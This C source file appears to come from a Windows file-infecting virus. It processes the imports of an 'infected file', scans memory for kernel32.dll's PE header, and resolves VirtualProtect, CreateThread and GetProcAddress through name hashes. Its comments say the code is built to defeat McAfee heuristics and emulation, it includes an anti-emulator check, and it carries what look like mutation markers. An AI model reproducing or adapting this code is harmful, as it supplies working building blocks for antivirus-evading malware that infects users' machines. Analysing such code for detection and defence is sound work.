
///////////////////////////////////////////////////////////////
// Is string 'KERNEL32' - case insensitive ////////////////////

#ifdef _MSC_VER
	#pragma optimize("", off)
#else
	#pragma optimize(off)
#endif

BOOL IsStrKERNEL32(char *s)
{
	//@S
	if (/*@S&&*/(s[0]!='K') && (s[0]!='k')/*@E*/) return FALSE;
	if (/*@S&&*/(s[1]!='E') && (s[1]!='e')/*@E*/) return FALSE;
	if (/*@S&&*/(s[2]!='R') && (s[2]!='r')/*@E*/) return FALSE;
	if (/*@S&&*/(s[5]!='L') && (s[5]!='l')/*@E*/) return FALSE;
	if (/*@S!=*/s[6]!='3'/*@E*/) return FALSE;
	//@E
	
	return TRUE;
}

///////////////////////////////////////////////////////////////
// Check API Function address /////////////////////////////////

DWORD GetFuncAddr(DWORD k,DWORD q,EXPORT_DIRECTORY_TABLE *edt)
{
	wMEMORY *wmem;       //@S
	dMEMORY *dmem; 
	DWORD ord;
	DWORD fncaddr=0;     //@E
	_KERNEL32 = (HANDLE)k; 

	wmem = (LPVOID)(/*@S+*/k + q*2 + edt->OrdinalTableRVA/*@E*/);
	ord=wmem->word0; // ordinal (index in AddressTable)

	dmem = (LPVOID)(/*@S+*/k + ord*4 + edt->AddressTableRVA/*@E*/);
	fncaddr=/*@S+*/k + dmem->dword0/*@E*/;

	#ifdef EXEFILE
	 adddeb(" ... GetFuncAddr OrdinalBase:%u addr:0x%X",ord+edt->OrdinalBase,fncaddr);
	#endif

	return fncaddr;
}

///////////////////////////////////////////////////////////////
// Check Func /////////////////////////////////////////////////

void CheckFunc(unsigned char *fncname,DWORD k,DWORD q,EXPORT_DIRECTORY_TABLE *edt)
{
	DWORD lf=strlen(fncname); //@S
	DWORD summ=0;
	DWORD humm=0;             //@E
	DWORD w, hash;

	for (w = 0; w < lf; w++) 
	{ /*@S;*/summ+=fncname[w]; humm+=fncname[w/2]/*@E*/; }

	if (lf > 41) return;                                          //@S
	hash = /*@S+*/lf*100000000 + summ*10000 + humm/*@E*/;   //@E

	#ifdef EXEFILE
	 adddeb("hash:%u func|lf:%u *100000000|summ:%u *10000|humm:%u|%s",hash,lf,summ,humm,fncname);
	#endif

	//@S
	if (hash==1414801486) _VirtualProtect = (DWORD*)GetFuncAddr(k,q,edt);
	if (hash==1212041152) { _GetTickCount = (DWORD*)GetFuncAddr(k,q,edt); GetTicks1(); EMUL=AntiEmulator(2); }
	if (hash==2020292000) _LeaveCriticalSection = (DWORD*)GetFuncAddr(k,q,edt);
	if (hash==2020462034) _EnterCriticalSection = (DWORD*)GetFuncAddr(k,q,edt);
	if (hash==2525782551) _InitializeCriticalSection = (DWORD*)GetFuncAddr(k,q,edt); 
	if (hash==1414021384) _GetProcAddress = (DWORD*)GetFuncAddr(k,q,edt);            
	if (hash==1211961192) _CreateThread = (DWORD*)GetFuncAddr(k,q,edt);              
// if (hash==505050483)  _Sleep = (DWORD*)GetFuncAddr(k,q,edt);
 //@E
}

///////////////////////////////////////////////////////////////
// Check Kernel ///////////////////////////////////////////////

void CheckKernel(DWORD k0)
{
	// --- Get kernel32.dll MZ header

	//@S
	dMEMORY *dmem;
	wMEMORY *wmem;
	PE_HEADER *pe;
	DWORD keRVA;
	unsigned char *dlln;
	EXPORT_DIRECTORY_TABLE *edt;
	DWORD q, k = k0 >> 16; // kernel32.dll addr part1
	//@E

	k = k << 16;        // kernel32.dll addr part2. we have to split it due to lcc compiler bug:
	                // DWORD k=(k0>>(5+LNMB1+LNMB0))<<(5+LNMB1+LNMB0);

	#ifdef EXEFILE
	 adddeb("---CheckKernel k0:%X k:%X",k0,k);
	#endif

	// --- Find PE header

	// step can be only 2^x, where x from 0 to 16 (1-65536)
	// to kill McAfee heuristic we use this

	k = FindPEheader(k, k0, 0x1000, &pe);

	#ifdef EXEFILE
	 adddeb("   CheckKernel pe found!");
	#endif

	// --- Get export table RVA

	keRVA = pe->exportrva;                      // kernel32.dll export RVA

	edt=(LPVOID)(/*@S+*/k+keRVA/*@E*/);         // export directory table

	dlln=(LPVOID)(/*@S+*/k+edt->NameRVA/*@E*/); // dll name

	#ifdef EXEFILE
	 adddeb("   CheckKernel k0:%X k:%X k+keRVA:%X %s",k0,k,k+keRVA,dlln);
	#endif

	//===== THIS IS THE END OF McAfee EMULATION ZONE
	//===== zaglushka vmesto realnoi kernel32 v mem i poetomu IsStrKERNEL32 sdelaet return 

	if (/*@S==*/IsStrKERNEL32(dlln)==FALSE/*@E*/) return; // Kernel32.dll check

	// --- List export functions

	for (q = 0; q < edt->NumOfNamePointers; q++)
	{
		DWORD fnadr;
		
		dmem = (LPVOID)(/*@S+*/k+q*4+edt->NamePointersRVA/*@E*/);
		fnadr=/*@S+*/k+dmem->dword0/*@E*/; // func name addr
	 
	 #ifdef EXEFILE
	  //adddeb("   CheckKernel fnadr:%X %s",fnadr,fnadr);
	 #endif

		CheckFunc((LPVOID)fnadr,k,q,edt);
	}

	 // EMUL==1 if not emulated, could be set to in CheckFunc
	_KERNEL32 = (HANDLE)((DWORD)_KERNEL32 * EMUL); 
}

///////////////////////////////////////////////////////////////
// Process infected file Imports from Specified dll ///////////

void ProcessDLLimports(DWORD a,IMPORT_DIRECTORY_TABLE_ENTRY *idte)
{
  char *dlln=(LPVOID)(/*@S+*/a+idte->NameRVA/*@E*/); //@S //dll name
  
  EMUL = 0;                                            //@E // "emulator off" flag
		 
  #ifdef EXEFILE
   adddeb("ProcessDLLimports %s %X %X",dlln,idte->AddressTableRVA,idte->ForwardChain);
  #endif

  if (/*@S==*/IsStrKERNEL32(dlln)==TRUE/*@E*/) // Kernel32.dll check
  {
   //@S
   DWORD q=0;
   dMEMORY *dmem;
   DWORD k0;  // any address in kernel32.dll (addr of first imported func)
   DWORD atadr=/*@S+*/a+idte->AddressTableRVA/*@E*/;  // address table addr
   //@E 

   while (TRUE) // list all func. addresses from address table
   {
   		dmem = (LPVOID)(/*@S+*/atadr+q/*@E*/);
   		k0=dmem->dword0;
   		if (/*@S==*/k0 == 0/*@E*/) break;
   		CheckKernel(k0);
   		if (/*@S!=*/_KERNEL32 != NULL/*@E*/) return;  //@S
   		q+=4;                                         //@E
   }

  }         
}

///////////////////////////////////////////////////////////////
// Find PEheader, step: 2^x, where x from 0 to 16 (1-0x10000)//
// NO GLOBAL VARS SHOULD BE USED HERE!

DWORD FindPEheader(DWORD a,DWORD a0,DWORD step,LPDWORD lp_peheader)
{
	// --- Find MZ header

	wMEMORY *wmem; //@S
	dMEMORY *dmem; 
	PE_HEADER *pe; //@E
	DWORD peadr;

 nxtblk:;
	wmem = (LPVOID)a;

	if (/*@S!=*/wmem->word0 != 0x5A4D/*@E*/) goto next; //@S // 'MZ'==0x4D5A
	if (/*@S!=*/a != (a>>16)<<16/*@E*/) goto next;      //@E // a should be also 64kb aligned!

	#ifdef EXEFILE
	 adddeb("FindPEheader FOUND a:%X",a); 
	#endif

	 // --- Check PE header

	dmem = (LPVOID)(/*@S+*/a+0x3C/*@E*/);
	peadr = /*@S+*/a + dmem->dword0/*@E*/;

	if (peadr > a0) goto next; //@S // not PE or corrupted

	pe = (LPVOID)peadr;        //@E

	if (/*@S!=*/ (pe->id & 0x0000FFFF) != 0x4550/*@E*/) goto next; // no 'PE' sig

	goto pe_found;

	// --- not found, one more iteration

	next:; a-=step; goto nxtblk; 

	// --- PE found

	pe_found:;

	#ifdef EXEFILE
	 adddeb("FindPEheader pe_found:%X",peadr); 
	#endif

	*lp_peheader = peadr; //save peadr to dword, pointed by lpe

	return a;
}

#ifdef _MSC_VER
	#pragma optimize("", on)
#else
	#pragma optimize(on)
#endif
